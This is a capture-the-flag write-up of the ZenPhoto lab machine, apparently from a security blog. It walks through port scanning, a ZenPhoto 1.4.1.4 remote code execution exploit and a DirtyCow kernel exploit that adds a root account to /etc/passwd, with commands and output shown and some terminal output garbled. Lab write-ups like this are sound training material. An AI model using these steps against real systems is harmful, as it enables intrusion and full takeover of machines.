---
title: "Proving grounds Practice: ZenPhoto"
layout: post
date: 2024-04-28 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- 
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
```

## 80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))

http://192.168.209.41/test/

```sh
[21:42:10] Starting: 
[21:42:12] 200 -   75B  - /index
[21:42:22] 301 -  315B  - /test  ->  http://192.168.209.41/test/
```

Upon reviewing the page source it was found that the website is using zenphoto version 1.4.1.4 [8157] (Official Build). The version is vulnerable to [Remote Code Execution Vulnerability](https://www.exploit-db.com/exploits/18083).

```sh
naveenj@hackerspace:[21:58]~/proving_grounds/ZenPhoto/exploit$ php exploit 192.168.209.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# 
```

## Privilege Escalation
   
Vulnerable to [CVE-2016-5195] dirtycow 2 exploit.

```text
Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Exposure: highly probable
Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
Download URL: https://www.exploit-db.com/download/40839
ext-url: https://www.exploit-db.com/download/40847
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

### Exploitation

Find the exploit [here](https://www.exploit-db.com/exploits/40839).

```sh
ww-data@offsecsrv:/tmp$ ls
dirty.c  lp.sh	vmware-root
www-data@offsecsrv:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@offsecsrv:/tmp$ ls
dirty  dirty.c	lp.sh  vmware-root
www-data@offsecsrv:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7860000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@offsecsrv:/tmp$ cat /emadvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
tc
```

Check /etc/passwd file for the root user presence.

```sh
www-data@offsecsrv:/tmp$ cat /etc/passwd
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash	#user created
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
```

**Root Obtained**

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).